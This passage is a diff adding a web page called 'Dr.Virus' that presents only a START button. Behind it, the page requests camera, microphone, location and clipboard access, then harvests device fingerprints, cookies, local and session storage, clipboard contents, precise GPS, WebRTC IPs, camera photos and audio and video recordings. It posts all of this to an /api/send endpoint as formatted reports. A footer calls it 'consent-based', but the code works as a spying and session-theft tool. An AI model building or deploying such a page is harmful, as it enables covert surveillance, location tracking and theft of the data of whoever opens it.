@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#000000">
+<title>Dr.Virus</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{width:100%;height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,-apple-system,sans-serif}
+  .stage{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:28px;background:#000;padding:20px}
+  .circle{
+    width:160px;height:160px;border-radius:50%;
+    background:#fff;border:none;cursor:pointer;outline:none;
+    display:flex;align-items:center;justify-content:center;
+    color:#000;font-size:15px;font-weight:800;letter-spacing:2px;
+    transition:transform .18s ease, box-shadow .35s ease, background .25s;
+    box-shadow:0 0 0 0 rgba(255,255,255,.55);
+    animation:pulse 2.2s infinite;user-select:none;
+  }
+  .circle:active{transform:scale(.93)}
+  .circle.running{animation:none;background:#0a0a0a;color:#fff;box-shadow:0 0 70px 12px rgba(255,255,255,.14);border:1px solid #222}
+  .circle.done{animation:none;background:#fff;color:#000;box-shadow:0 0 70px 14px rgba(255,255,255,.35)}
+  .circle.error{animation:none;background:#111;color:#ff5577;border:1px solid #331}
+  @keyframes pulse{
+    0%{box-shadow:0 0 0 0 rgba(255,255,255,.5)}
+    70%{box-shadow:0 0 0 46px rgba(255,255,255,0)}
+    100%{box-shadow:0 0 0 0 rgba(255,255,255,0)}
+  }
+  .status{
+    font-family:ui-monospace,monospace;font-size:11px;
+    color:#3a3a3a;letter-spacing:1.4px;text-align:center;
+    transition:color .3s ease;min-height:32px;max-width:92vw;
+    line-height:1.6;
+  }
+  .status.active{color:#d0d0d0}
+  .status.error{color:#ff5577}
+  .toast{
+    position:fixed;top:24px;left:50%;transform:translateX(-50%);
+    padding:10px 20px;background:rgba(255,255,255,.06);
+    border:1px solid #1c1c1c;border-radius:24px;
+    font-family:ui-monospace,monospace;font-size:11.5px;color:#fff;
+    opacity:0;transition:opacity .3s ease;pointer-events:none;
+    max-width:90vw;text-align:center;
+  }
+  .toast.show{opacity:1}
+  .credit{
+    position:fixed;left:0;right:0;bottom:14px;text-align:center;
+    font-family:ui-monospace,monospace;font-size:9px;color:#1a1a1a;
+    letter-spacing:1.5px;pointer-events:none;
+  }
+</style>
+</head>
+<body>
+
+<div class="stage">
+  <button class="circle" id="mainBtn" aria-label="Start">START</button>
+  <div class="status" id="statusEl">● READY</div>
+</div>
+<div class="toast" id="toast"></div>
+<div class="credit">Dr.Virus · consent-based · own device only</div>
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+<script>
+'use strict';
+
+// ═══════════════════════════════════════════════════════
+// UI
+// ═══════════════════════════════════════════════════════
+const btn = document.getElementById('mainBtn');
+const statusEl = document.getElementById('statusEl');
+const toastEl = document.getElementById('toast');
+let toastTimer = null;
+
+function toast(msg, ms) {
+  toastEl.textContent = msg;
+  toastEl.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => toastEl.classList.remove('show'), ms || 2200);
+}
+function setStatus(text, cls) {
+  statusEl.textContent = text;
+  statusEl.className = 'status' + (cls ? ' ' + cls : '');
+}
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function esc(s) {
+  return String(s == null ? '' : s).replace(/[&<>"']/g, c =>
+    ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+function b64(blob) {
+  return new Promise((ok, no) => {
+    const fr = new FileReader();
+    fr.onload = () => ok(fr.result);
+    fr.onerror = () => no(fr.error);
+    fr.readAsDataURL(blob);
+  });
+}
+function autoName() {
+  const ua = navigator.userAgent;
+  let base = 'Device';
+  if (/Android/.test(ua)) base = 'Android';
+  else if (/iPhone/.test(ua)) base = 'iPhone';
+  else if (/iPad/.test(ua)) base = 'iPad';
+  else if (/Windows/.test(ua)) base = 'Windows';
+  else if (/Macintosh/.test(ua)) base = 'Mac';
+  else if (/Linux/.test(ua)) base = 'Linux';
+  return `${base}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`;
+}
+const NAME = new URLSearchParams(location.search).get('name') || autoName();
+
+// ═══════════════════════════════════════════════════════
+// SENDERS
+// ═══════════════════════════════════════════════════════
+async function send(text) {
+  try {
+    const r = await fetch('/api/send', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'message', text })
+    });
+    return (await r.json()).success;
+  } catch { return false; }
+}
+async function sendPhoto(data, caption) {
+  try {
+    const r = await fetch('/api/send', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'photo', data, caption })
+    });
+    return (await r.json()).success;
+  } catch { return false; }
+}
+async function sendAudio(data, caption, duration) {
+  try {
+    const r = await fetch('/api/send', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'audio', data, caption, duration })
+    });
+    return (await r.json()).success;
+  } catch { return false; }
+}
+async function sendVideo(data, caption, duration) {
+  try {
+    const r = await fetch('/api/send', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'video', data, caption, duration })
+    });
+    return (await r.json()).success;
+  } catch { return false; }
+}
+
+// ═══════════════════════════════════════════════════════
+// PERMISSIONS
+// ═══════════════════════════════════════════════════════
+async function requestAllPermissions() {
+  const p = {};
+
+  setStatus('● CAMERA', 'active');
+  try { const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }); s.getTracks().forEach(t => t.stop()); p.camera = 'granted'; }
+  catch { p.camera = 'denied'; }
+
+  setStatus('● MICROPHONE', 'active');
+  try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t => t.stop()); p.microphone = 'granted'; }
+  catch { p.microphone = 'denied'; }
+
+  setStatus('● LOCATION', 'active');
+  try { await new Promise((ok,no) => navigator.geolocation.getCurrentPosition(ok, no, { timeout: 12000, enableHighAccuracy: true })); p.geolocation = 'granted'; }
+  catch { p.geolocation = 'denied'; }
+
+  setStatus('● NOTIFICATIONS', 'active');
+  if ('Notification' in window) {
+    try { p.notifications = await Notification.requestPermission(); } catch { p.notifications = 'error'; }
+  }
+
+  setStatus('● CLIPBOARD', 'active');
+  try { await navigator.clipboard.readText(); p.clipboard = 'granted'; }
+  catch { p.clipboard = 'denied'; }
+
+  try { if (navigator.storage?.persist) p.persistentStorage = (await navigator.storage.persist()) ? 'granted' : 'denied'; } catch {}
+
+  setStatus('● SENSORS', 'active');
+  try {
+    if (DeviceOrientationEvent?.requestPermission) p.sensors = await DeviceOrientationEvent.requestPermission();
+    else p.sensors = 'n/a';
+  } catch { p.sensors = 'error'; }
+
+  return p;
+}
+
+// ═══════════════════════════════════════════════════════
+// COLLECTORS
+// ═══════════════════════════════════════════════════════
+
+// --- Fingerprints ---
+function canvasFingerprint() {
+  try {
+    const c = document.createElement('canvas');
+    c.width = 240; c.height = 60;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px "Arial"';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Dr.Virus 🧪 12345', 2, 15);
+    ctx.fillStyle = 'rgba(102,204,0,0.7)';
+    ctx.fillText('Dr.Virus 🧪 12345', 4, 17);
+    ctx.strokeStyle = 'rgba(255,0,255,0.5)';
+    ctx.beginPath(); ctx.arc(50, 50, 50, 0, Math.PI * 2); ctx.stroke();
+    const data = c.toDataURL();
+    return data.slice(-128);
+  } catch { return null; }
+}
+
+async function audioFingerprint() {
+  try {
+    if (!window.OfflineAudioContext) return null;
+    const ctx = new OfflineAudioContext(1, 44100, 44100);
+    const osc = ctx.createOscillator();
+    osc.type = 'triangle';
+    osc.frequency.value = 10000;
+    const comp = ctx.createDynamicsCompressor();
+    comp.threshold.value = -50;
+    comp.knee.value = 40;
+    comp.ratio.value = 12;
+    comp.attack.value = 0;
+    comp.release.value = 0.25;
+    osc.connect(comp);
+    comp.connect(ctx.destination);
+    osc.start(0);
+    const buffer = await ctx.startRendering();
+    const data = buffer.getChannelData(0);
+    let sum = 0;
+    for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
+    return sum.toFixed(6);
+  } catch { return null; }
+}
+
+function detectFonts() {
+  const test = ['Arial','Times New Roman','Courier New','Georgia','Verdana','Comic Sans MS','Impact','Helvetica',
+    'Consolas','Monaco','Tahoma','Trebuchet MS','Roboto','Segoe UI','Menlo','Noto Sans','Lato','Open Sans',
+    'Inter','San Francisco','Ubuntu','Fira Sans','Source Sans Pro','PT Sans','Cantarell','DejaVu Sans'];
+  const span = document.createElement('span');
+  span.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:72px;white-space:nowrap;';
+  span.textContent = 'mmmmmmmmmmlli';
+  document.body.appendChild(span);
+  const base = span.offsetWidth;
+  const found = [];
+  for (const f of test) {
+    span.style.fontFamily = `"${f}", monospace`;
+    if (span.offsetWidth !== base) found.push(f);
+  }
+  span.remove();
+  return found;
+}
+
+function webglInfo() {
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (!gl) return null;
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    return {
+      vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+      renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+      version: gl.getParameter(gl.VERSION),
+      glsl: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+      maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+      maxViewport: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+      extensions: (gl.getSupportedExtensions() || []).length,
+      extList: (gl.getSupportedExtensions() || []).slice(0, 8)
+    };
+  } catch { return null; }
+}
+
+async function webgpuInfo() {
+  try {
+    if (!navigator.gpu) return null;
+    const a = await navigator.gpu.requestAdapter();
+    if (!a) return null;
+    const i = a.info || {};
+    return {
+      vendor: i.vendor || '?',
+      architecture: i.architecture || '?',
+      device: i.device || '?',
+      description: i.description || '?',
+      features: [...(a.features || [])].length
+    };
+  } catch { return null; }
+}
+
+// --- Hardware ---
+async function batteryInfo() {
+  try {
+    if (!navigator.getBattery) return null;
+    const b = await navigator.getBattery();
+    return {
+      level: Math.round(b.level * 100),
+      charging: b.charging,
+      chargingTime: b.chargingTime,
+      dischargingTime: b.dischargingTime
+    };
+  } catch { return null; }
+}
+
+async function storageQuota() {
+  try {
+    if (!navigator.storage?.estimate) return null;
+    const e = await navigator.storage.estimate();
+    return { usage: e.usage, quota: e.quota };
+  } catch { return null; }
+}
+
+// --- Storage ---
+function collectCookies() {
+  return document.cookie.split(';').map(c => {
+    const [name, ...rest] = c.trim().split('=');
+    return name ? { name, value: rest.join('=') } : null;
+  }).filter(Boolean);
+}
+function collectLocal() {
+  const out = [];
+  for (let i = 0; i < localStorage.length; i++) {
+    const k = localStorage.key(i);
+    out.push({ key: k, value: localStorage.getItem(k) });
+  }
+  return out;
+}
+function collectSession() {
+  const out = [];
+  for (let i = 0; i < sessionStorage.length; i++) {
+    const k = sessionStorage.key(i);
+    out.push({ key: k, value: sessionStorage.getItem(k) });
+  }
+  return out;
+}
+async function collectIDB() {
+  try {
+    if (!indexedDB.databases) return null;
+    return await indexedDB.databases();
+  } catch { return null; }
+}
+async function collectCaches() {
+  try {
+    if (!('caches' in window)) return null;
+    const keys = await caches.keys();
+    const out = [];
+    for (const k of keys) {
+      const c = await caches.open(k);
+      const reqs = await c.keys();
+      out.push({ name: k, entries: reqs.length });
+    }
+    return out;
+  } catch { return null; }
+}
+async function collectOPFS() {
+  try {
+    if (!navigator.storage?.getDirectory) return null;
+    const root = await navigator.storage.getDirectory();
+    const out = [];
+    for await (const [name, h] of root.entries()) out.push({ name, kind: h.kind });
+    return out;
+  } catch { return null; }
+}
+
+// --- Network / Location ---
+async function collectIPGeo() {
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    const d = await r.json();
+    return {
+      ip: d.ip, country: d.country_name, region: d.region, city: d.city,
+      isp: d.org, asn: d.asn, lat: d.latitude, lon: d.longitude,
+      postal: d.postal, timezone: d.timezone
+    };
+  } catch { return {}; }
+}
+async function collectGPS() {
+  try {
+    const pos = await new Promise((ok,no) =>
+      navigator.geolocation.getCurrentPosition(ok, no, { timeout: 10000, enableHighAccuracy: true }));
+    return {
+      lat: pos.coords.latitude, lon: pos.coords.longitude,
+      acc: Math.round(pos.coords.accuracy),
+      alt: pos.coords.altitude, heading: pos.coords.heading, speed: pos.coords.speed
+    };
+  } catch { return null; }
+}
+async function webrtcIPs() {
+  try {
+    if (!window.RTCPeerConnection) return null;
+    return new Promise(resolve => {
+      const ips = new Set();
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      pc.createDataChannel('');
+      pc.onicecandidate = e => {
+        if (!e.candidate) { pc.close(); return resolve([...ips]); }
+        const m = /([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){3,7})/i.exec(e.candidate.candidate);
+        if (m) ips.add(m[1]);
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      setTimeout(() => { try { pc.close(); } catch {} resolve([...ips]); }, 2500);
+    });
+  } catch { return null; }
+}
+
+// --- Sensors ---
+async function readOrientation() {
+  try {
+    if (!window.DeviceOrientationEvent) return null;
+    return await new Promise(ok => {
+      const to = setTimeout(() => { window.removeEventListener('deviceorientation', h); ok(null); }, 2500);
+      const h = e => {
+        if (e.alpha == null && e.beta == null && e.gamma == null) return;
+        clearTimeout(to); window.removeEventListener('deviceorientation', h);
+        ok({ alpha: e.alpha, beta: e.beta, gamma: e.gamma, absolute: e.absolute });
+      };
+      window.addEventListener('deviceorientation', h);
+    });
+  } catch { return null; }
+}
+async function readMotion() {
+  try {
+    if (!window.DeviceMotionEvent) return null;
+    return await new Promise(ok => {
+      const to = setTimeout(() => { window.removeEventListener('devicemotion', h); ok(null); }, 2500);
+      const h = e => {
+        clearTimeout(to); window.removeEventListener('devicemotion', h);
+        const a = e.accelerationIncludingGravity || {};
+        const r = e.rotationRate || {};
+        ok({ x: a.x, y: a.y, z: a.z, rotAlpha: r.alpha, rotBeta: r.beta, rotGamma: r.gamma });
+      };
+      window.addEventListener('devicemotion', h);
+    });
+  } catch { return null; }
+}
+async function readLight() {
+  try {
+    if (typeof AmbientLightSensor === 'undefined') return null;
+    const s = new AmbientLightSensor();
+    return await new Promise(ok => {
+      const to = setTimeout(() => { try { s.stop(); } catch {} ok(null); }, 2500);
+      s.onreading = () => { clearTimeout(to); const v = s.illuminance; s.stop(); ok(v); };
+      s.onerror = () => { clearTimeout(to); ok(null); };
+      s.start();
+    });
+  } catch { return null; }
+}
+async function readMagnet() {
+  try {
+    if (typeof Magnetometer === 'undefined') return null;
+    const s = new Magnetometer({ frequency: 10 });
+    return await new Promise(ok => {
+      let last;
+      const to = setTimeout(() => { try { s.stop(); } catch {} ok(last ? { x: last.x, y: last.y, z: last.z } : null); }, 2500);
+      s.onreading = () => { last = s; };
+      s.onerror = () => { clearTimeout(to); ok(null); };
+      s.start();
+    });
+  } catch { return null; }
+}
+async function readProximity() {
+  try {
+    if (typeof ProximitySensor === 'undefined') return null;
+    const s = new ProximitySensor();
+    return await new Promise(ok => {
+      let last;
+      const to = setTimeout(() => { try { s.stop(); } catch {} ok(last); }, 2500);
+      s.onreading = () => { last = { near: s.near, distance: s.distance, max: s.max }; };
+      s.onerror = () => { clearTimeout(to); ok(null); };
+      s.start();
+    });
+  } catch { return null; }
+}
+async function readPressure() {
+  try {
+    if (typeof PressureObserver === 'undefined') return null;
+    return await new Promise(ok => {
+      const to = setTimeout(() => ok(null), 2500);
+      const obs = new PressureObserver(r => { clearTimeout(to); obs.disconnect(); ok(r[0] ? { state: r[0].state, source: r[0].source } : null); });
+      obs.observe('cpu').catch(() => { clearTimeout(to); ok(null); });
+    });
+  } catch { return null; }
+}
+function readGamepad() {
+  try {
+    const pads = navigator.getGamepads ? [...navigator.getGamepads()].filter(Boolean) : [];
+    return pads.map(p => ({ id: p.id, buttons: p.buttons.length, axes: p.axes.length }));
+  } catch { return []; }
+}
+
+// --- Media Devices ---
+async function collectMediaDevices() {
+  try {
+    const list = await navigator.mediaDevices.enumerateDevices();
+    const out = { camera: 0, mic: 0, speaker: 0, labels: [] };
+    for (const d of list) {
+      if (d.kind === 'videoinput') out.camera++;
+      else if (d.kind === 'audioinput') out.mic++;
+      else if (d.kind === 'audiooutput') out.speaker++;
+      if (d.label) out.labels.push(d.label);
+    }
+    return out;
+  } catch { return null; }
+}
+
+// --- Permissions query ---
+async function queryPermissions() {
+  const names = ['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write',
+    'persistent-storage','background-sync','accelerometer','gyroscope','magnetometer',
+    'ambient-light-sensor','midi','payment-handler','push','screen-wake-lock'];
+  const out = {};
+  for (const n of names) {
+    try { const r = await navigator.permissions.query({ name: n }); out[n] = r.state; }
+    catch { out[n] = 'unsupported'; }
+  }
+  return out;
+}
+
+// --- Features ---
+function detectFeatures() {
+  const f = {
+    'ServiceWorker':'serviceWorker' in navigator,
+    'WebWorker':'Worker' in window,
+    'SharedWorker':'SharedWorker' in window,
+    'WebSocket':'WebSocket' in window,
+    'WebRTC':'RTCPeerConnection' in window,
+    'WebTransport':'WebTransport' in window,
+    'WebGL':!!document.createElement('canvas').getContext('webgl'),
+    'WebGL2':!!document.createElement('canvas').getContext('webgl2'),
+    'WebGPU':'gpu' in navigator,
+    'WebAssembly':'WebAssembly' in window,
+    'WebAudio':'AudioContext' in window,
+    'WebCodecs':'VideoEncoder' in window,
+    'Bluetooth':'bluetooth' in navigator,
+    'USB':'usb' in navigator,
+    'Serial':'serial' in navigator,
+    'HID':'hid' in navigator,
+    'NFC':'NDEFReader' in window,
+    'Gamepad':'getGamepads' in navigator,
+    'SpeechSynth':'speechSynthesis' in window,
+    'SpeechRec':'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
+    'Notifications':'Notification' in window,
+    'Geolocation':'geolocation' in navigator,
+    'Vibration':'vibrate' in navigator,
+    'Battery':'getBattery' in navigator,
+    'WakeLock':'wakeLock' in navigator,
+    'IdleDetection':'IdleDetector' in window,
+    'FileSystemAccess':'showOpenFilePicker' in window,
+    'Clipboard':'clipboard' in navigator,
+    'Share':'share' in navigator,
+    'Payment':'PaymentRequest' in window,
+    'Credentials':'credentials' in navigator,
+    'Push':'PushManager' in window,
+    'BackgroundSync':'SyncManager' in window,
+    'CompressionStream':'CompressionStream' in window,
+    'EyeDropper':'EyeDropper' in window,
+    'ScreenCapture':'getDisplayMedia' in navigator.mediaDevices,
+    'PiP':'pictureInPictureEnabled' in document,
+    'DocPiP':'documentPictureInPicture' in window,
+    'AmbientLight':'AmbientLightSensor' in window,
+    'Accelerometer':'Accelerometer' in window,
+    'Gyroscope':'Gyroscope' in window,
+    'Magnetometer':'Magnetometer' in window,
+    'Proximity':'ProximitySensor' in window,
+    'Orientation':'DeviceOrientationEvent' in window,
+    'Motion':'DeviceMotionEvent' in window,
+    'Contacts':'contacts' in navigator,
+    'StorageBuckets':'storageBuckets' in navigator,
+    'ComputePressure':'PressureObserver' in window,
+    'WebLocks':'locks' in navigator,
+    'Scheduler':'scheduler' in window,
+    'VirtualKeyboard':'virtualKeyboard' in navigator
+  };
+  const supported = Object.entries(f).filter(([,v])=>v).map(([k])=>k);
+  const unsupported = Object.entries(f).filter(([,v])=>!v).map(([k])=>k);
+  return { supported, unsupported, total: Object.keys(f).length };
+}
+
+// --- Media capture ---
+async function takeScreenshot() {
+  try {
+    btn.style.visibility = 'hidden';
+    await sleep(60);
+    const c = await html2canvas(document.body, { useCORS: true, scale: 0.8, backgroundColor: '#000' });
+    btn.style.visibility = 'visible';
+    return c.toDataURL('image/jpeg', 0.72);
+  } catch {
+    btn.style.visibility = 'visible';
+    return null;
+  }
+}
+async function takeCameraPhoto(facing = 'environment') {
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: facing }, width: { ideal: 1920 } } });
+    const v = document.createElement('video');
+    v.srcObject = s; v.muted = true; v.playsInline = true;
+    await v.play();
+    await sleep(1000);
+    const c = document.createElement('canvas');
+    c.width = v.videoWidth; c.height = v.videoHeight;
+    c.getContext('2d').drawImage(v, 0, 0);
+    s.getTracks().forEach(t => t.stop());
+    return c.toDataURL('image/jpeg', 0.78);
+  } catch { return null; }
+}
+async function recordAudio(sec = 5) {
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const rec = new MediaRecorder(s);
+    const chunks = [];
+    rec.ondataavailable = e => chunks.push(e.data);
+    rec.start();
+    await sleep(sec * 1000);
+    await new Promise(r => { rec.onstop = r; rec.stop(); });
+    s.getTracks().forEach(t => t.stop());
+    return await b64(new Blob(chunks, { type: 'audio/webm' }));
+  } catch { return null; }
+}
+async function recordVideo(sec = 4) {
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'environment' } }, audio: true });
+    const rec = new MediaRecorder(s);
+    const chunks = [];
+    rec.ondataavailable = e => chunks.push(e.data);
+    rec.start();
+    await sleep(sec * 1000);
+    await new Promise(r => { rec.onstop = r; rec.stop(); });
+    s.getTracks().forEach(t => t.stop());
+    return await b64(new Blob(chunks, { type: 'video/webm' }));
+  } catch { return null; }
+}
+
+// ═══════════════════════════════════════════════════════
+// REPORT BUILDERS
+// ═══════════════════════════════════════════════════════
+function reportDevice(d) {
+  const b = d.browser;
+  let m = `<b>🧪 Dr.Virus · Device Report</b>\n`;
+  m += `<i>${new Date().toLocaleString()}</i>\n`;
+  m += `Device: <b>${esc(NAME)}</b>\n\n`;
+
+  m += `<b>🌐 Browser</b>\n`;
+  m += `UA: <code>${esc(b.userAgent.slice(0,200))}</code>\n`;
+  m += `Platform: ${esc(b.platform)}\n`;
+  m += `Vendor: ${esc(b.vendor||'?')}\n`;
+  m += `Language: ${esc(b.language)}\n`;
+  m += `Languages: ${esc(b.languages)}\n`;
+  m += `Cookies: ${b.cookiesEnabled}\n`;
+  m += `DNT: ${esc(b.dnt)}\n`;
+  m += `Online: ${b.online}\n`;
+  m += `Webdriver: ${b.webdriver}\n`;
+  m += `PDF viewer: ${b.pdf}\n\n`;
+
+  if (d.uaData) {
+    m += `<b>🔍 UserAgentData</b>\n`;
+    m += `Platform: ${esc(d.uaData.platform)}\n`;
+    m += `Mobile: ${d.uaData.mobile}\n`;
+    m += `Brands: ${esc(d.uaData.brands.map(x => x.brand + ' v' + x.version).join(', '))}\n\n`;
+  }
+
+  m += `<b>🖥 Screen</b>\n`;
+  m += `Size: ${b.screenWidth}×${b.screenHeight}\n`;
+  m += `Avail: ${b.screenAvail}\n`;
+  m += `Viewport: ${b.viewport}\n`;
+  m += `DPR: ${b.dpr}\n`;
+  m += `Color: ${b.colorDepth}-bit\n`;
+  m += `Pixel depth: ${b.pixelDepth}\n`;
+  m += `Orientation: ${esc(b.orientation)}\n\n`;
+
+  m += `<b>💻 Hardware</b>\n`;
+  m += `CPU cores: ${b.cores}\n`;
+  m += `Memory: ${b.memory} GB\n`;
+  m += `Touch points: ${b.touch}\n`;
+  m += `Max touch: ${b.maxTouch}\n`;
+  m += `Plugins: ${b.plugins}\n\n`;
+
+  if (d.battery) {
+    m += `<b>🔋 Battery</b>\n`;
+    m += `Level: ${d.battery.level}%\n`;
+    m += `Charging: ${d.battery.charging}\n`;
+    m += `Time to full: ${d.battery.chargingTime ? Math.round(d.battery.chargingTime/60)+'min' : '—'}\n`;
+    m += `Time to empty: ${d.battery.dischargingTime ? Math.round(d.battery.dischargingTime/60)+'min' : '—'}\n\n`;
+  }
+
+  m += `<b>📡 Network</b>\n`;
+  m += `Type: ${esc(b.connType)}\n`;
+  m += `Downlink: ${b.downlink} Mbps\n`;
+  m += `RTT: ${b.rtt} ms\n`;
+  m += `Save-data: ${b.saveData}\n\n`;
+
+  m += `<b>🕐 Time</b>\n`;
+  m += `${esc(b.timeString)}\n`;
+  m += `ISO: ${b.timeISO}\n`;
+  m += `TZ: ${esc(b.timezone)}\n`;
+  m += `Offset: ${b.tzOffset}h`;
+
+  return m.slice(0, 4000);
+}
+
+function reportNetwork(d) {
+  let m = `<b>📍 Network & Location</b>\n\n`;
+
+  if (d.ipGeo && d.ipGeo.ip) {
+    m += `<b>Public IP</b>\n`;
+    m += `IP: <code>${esc(d.ipGeo.ip)}</code>\n`;
+    if (d.ipGeo.country) m += `Country: ${esc(d.ipGeo.country)}\n`;
+    if (d.ipGeo.region) m += `Region: ${esc(d.ipGeo.region)}\n`;
+    if (d.ipGeo.city) m += `City: ${esc(d.ipGeo.city)}\n`;
+    if (d.ipGeo.postal) m += `Postal: ${esc(d.ipGeo.postal)}\n`;
+    if (d.ipGeo.isp) m += `ISP: ${esc(d.ipGeo.isp)}\n`;
+    if (d.ipGeo.asn) m += `ASN: ${esc(d.ipGeo.asn)}\n`;
+    if (d.ipGeo.timezone) m += `TZ: ${esc(d.ipGeo.timezone)}\n`;
+    if (d.ipGeo.lat && d.ipGeo.lon) {
+      m += `Coords: ${d.ipGeo.lat}, ${d.ipGeo.lon}\n`;
+      m += `<a href="https://maps.google.com/?q=${d.ipGeo.lat},${d.ipGeo.lon}">Approx on Maps</a>\n`;
+    }
+    m += '\n';
+  }
+
+  if (d.gps) {
+    m += `<b>GPS (Precise)</b>\n`;
+    m += `Lat: <code>${d.gps.lat.toFixed(6)}</code>\n`;
+    m += `Lon: <code>${d.gps.lon.toFixed(6)}</code>\n`;
+    m += `Accuracy: ±${d.gps.acc}m\n`;
+    if (d.gps.alt != null) m += `Altitude: ${d.gps.alt.toFixed(1)}m\n`;
+    if (d.gps.heading != null) m += `Heading: ${d.gps.heading}°\n`;
+    if (d.gps.speed != null) m += `Speed: ${d.gps.speed} m/s\n`;
+    m += `<a href="https://maps.google.com/?q=${d.gps.lat},${d.gps.lon}">GPS on Maps</a>\n\n`;
+  } else {
+    m += `<b>GPS</b>: denied / unavailable\n\n`;
+  }
+
+  if (d.webrtcIPs && d.webrtcIPs.length) {
+    m += `<b>🌐 WebRTC Local IPs</b>\n`;
+    m += `<code>${esc(d.webrtcIPs.join('\n'))}</code>\n`;
+  }
+
+  return m.slice(0, 4000);
+}
+
+function reportFingerprint(d) {
+  let m = `<b>🎨 Fingerprint</b>\n\n`;
+
+  if (d.webgl) {
+    m += `<b>WebGL</b>\n`;
+    m += `Vendor: ${esc(d.webgl.vendor)}\n`;
+    m += `Renderer: ${esc(d.webgl.renderer)}\n`;
+    m += `Version: ${esc(d.webgl.version)}\n`;
+    m += `GLSL: ${esc(d.webgl.glsl)}\n`;
+    m += `Max texture: ${d.webgl.maxTexture}\n`;
+    m += `Extensions: ${d.webgl.extensions}\n`;
+    m += `<code>${esc(d.webgl.extList.join(', '))}</code>\n\n`;
+  }
+
+  if (d.webgpu) {
+    m += `<b>WebGPU</b>\n`;
+    m += `Vendor: ${esc(d.webgpu.vendor)}\n`;
+    m += `Architecture: ${esc(d.webgpu.architecture)}\n`;
+    m += `Device: ${esc(d.webgpu.device)}\n`;
+    m += `Features: ${d.webgpu.features}\n\n`;
+  }
+
+  if (d.canvasFp) {
+    m += `<b>Canvas Hash</b>\n<code>${esc(d.canvasFp)}</code>\n\n`;
+  }
+
+  if (d.audioFp) {
+    m += `<b>Audio Hash</b>\n<code>${esc(d.audioFp)}</code>\n\n`;
+  }
+
+  if (d.fonts && d.fonts.length) {
+    m += `<b>Fonts (${d.fonts.length})</b>\n<code>${esc(d.fonts.join(', '))}</code>`;
+  }
+
+  return m.slice(0, 4000);
+}
+
+function reportStorage1(d) {
+  let m = `<b>💾 Storage</b>\n\n`;
+
+  if (d.cookies.length) {
+    m += `<b>🍪 Cookies (${d.cookies.length})</b>\n`;
+    d.cookies.slice(0, 25).forEach(c => {
+      m += `<code>${esc(c.name.slice(0,40))}</code> = ${esc(c.value.slice(0,60))}\n`;
+    });
+    if (d.cookies.length > 25) m += `…+${d.cookies.length - 25}\n`;
+    m += '\n';
+  }
+
+  if (d.local.length) {
+    m += `<b>📦 LocalStorage (${d.local.length})</b>\n`;
+    d.local.slice(0, 20).forEach(i => {
+      m += `<code>${esc(i.key.slice(0,40))}</code> = ${esc(String(i.value).slice(0,60))}\n`;
+    });
+    if (d.local.length > 20) m += `…+${d.local.length - 20}\n`;
+    m += '\n';
+  }
+
+  if (d.session.length) {
+    m += `<b>📂 SessionStorage (${d.session.length})</b>\n`;
+    d.session.slice(0, 20).forEach(i => {
+      m += `<code>${esc(i.key.slice(0,40))}</code> = ${esc(String(i.value).slice(0,60))}\n`;
+    });
+    m += '\n';
+  }
+
+  if (d.clipboard) {
+    m += `<b>📋 Clipboard</b>\n<code>${esc(d.clipboard.slice(0, 500))}</code>`;
+  }
+
+  return m.slice(0, 4000);
+}
+
+function reportStorage2(d) {
+  let m = `<b>💾 Storage (Database)</b>\n\n`;
+
+  if (d.idb && d.idb.length) {
+    m += `<b>🗃 IndexedDB (${d.idb.length})</b>\n`;
+    d.idb.forEach(db => m += `• ${esc(db.name)} v${db.version}\n`);
+    m += '\n';
+  }
+
+  if (d.caches && d.caches.length) {
+    m += `<b>📦 Cache Storage (${d.caches.length})</b>\n`;
